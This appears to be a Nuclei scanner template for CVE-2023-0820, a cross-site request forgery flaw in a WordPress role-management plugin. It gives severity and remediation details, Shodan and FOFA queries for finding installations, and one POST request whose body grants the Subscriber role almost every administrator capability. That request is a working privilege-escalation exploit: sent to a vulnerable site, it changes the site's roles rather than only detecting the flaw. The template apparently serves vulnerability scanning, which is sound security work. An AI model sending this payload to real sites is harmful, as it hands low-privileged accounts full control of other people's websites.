id: CVE-2023-0820

info:
  name: CSRF Privilege Escalation in User Role by BestWebSoft Plugin
  author: ProjectDiscoveryAI
  severity: high
  description: The User Role by BestWebSoft WordPress plugin before 1.6.7 does not protect against CSRF in requests to update role capabilities, leading to arbitrary privilege escalation of any role.
  impact: |
    An attacker can exploit this vulnerability to escalate their privileges within the application.
  remediation: |
    Update BestWebSoft Plugin to the latest version to mitigate the CSRF privilege escalation vulnerability.
  reference:
    - https://wpscan.com/vulnerability/b93d9f9d-0fd9-49b8-b465-d32b95351912
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2023-0820
    epss-score: 0.00229
    epss-percentile: 0.61814
    cpe: cpe:2.3:a:bestwebsoft:user_role:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: bestwebsoft
    product: user_role
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/user-role/"
    fofa-query: body=/wp-content/plugins/user-role/
    publicwww-query: /wp-content/plugins/user-role/
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=srrl_add_new_roles"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      srrl_action=update&srrl_role_name=Subscriber&srrl_role_slug=subscriber&srrl_role_caps%5B%5D=activate_plugins&srrl_role_caps%5B%5D=delete_plugins&srrl_role_caps%5B%5D=edit_plugins&srrl_role_caps%5B%5D=install_plugins&srrl_role_caps%5B%5D=update_plugins&srrl_role_caps%5B%5D=delete_themes&srrl_role_caps%5B%5D=edit_theme_options&srrl_role_caps%5B%5D=edit_themes&srrl_role_caps%5B%5D=install_themes&srrl_role_caps%5B%5D=switch_themes&srrl_role_caps%5B%5D=update_themes&srrl_role_caps%5B%5D=add_users&srrl_role_caps%5B%5D=create_users&srrl_role_caps%5B%5D=delete_users&srrl_role_caps%5B%5D=edit_users&srrl_role_caps%5B%5D=list_users&srrl_role_caps%5B%5D=promote_users&srrl_role_caps%5B%5D=remove_users&srrl_role_caps%5B%5D=delete_others_pages&srrl_role_caps%5B%5D=delete_pages&srrl_role_caps%5B%5D=delete_private_pages&srrl_role_caps%5B%5D=delete_published_pages&srrl_role_caps%5B%5D=edit_others_pages&srrl_role_caps%5B%5D=edit_pages&srrl_role_caps%5B%5D=edit_private_pages&srrl_role_caps%5B%5D=edit_published_pages&srrl_role_caps%5B%5D=publish_pages&srrl_role_caps%5B%5D=read_private_pages&srrl_role_caps%5B%5D=delete_others_posts&srrl_role_caps%5B%5D=delete_posts&srrl_role_caps%5B%5D=delete_private_posts&srrl_role_caps%5B%5D=delete_published_posts&srrl_role_caps%5B%5D=edit_others_posts&srrl_role_caps%5B%5D=edit_posts&srrl_role_caps%5B%5D=edit_private_posts&srrl_role_caps%5B%5D=edit_published_posts&srrl_role_caps%5B%5D=publish_posts&srrl_role_caps%5B%5D=read_private_posts&srrl_role_caps%5B%5D=edit_dashboard&srrl_role_caps%5B%5D=edit_files&srrl_role_caps%5B%5D=export&srrl_role_caps%5B%5D=import&srrl_role_caps%5B%5D=manage_categories&srrl_role_caps%5B%5D=manage_links&srrl_role_caps%5B%5D=manage_options&srrl_role_caps%5B%5D=moderate_comments&srrl_role_caps%5B%5D=read&srrl_role_caps%5B%5D=unfiltered_html&srrl_role_caps%5B%5D=unfiltered_upload&srrl_role_caps%5B%5D=update_core&srrl_role_caps%5B%5D=upload_files&srrl_save=1
    matchers:
      - type: word
        words:
          - "Role updated successfully"
        part: body
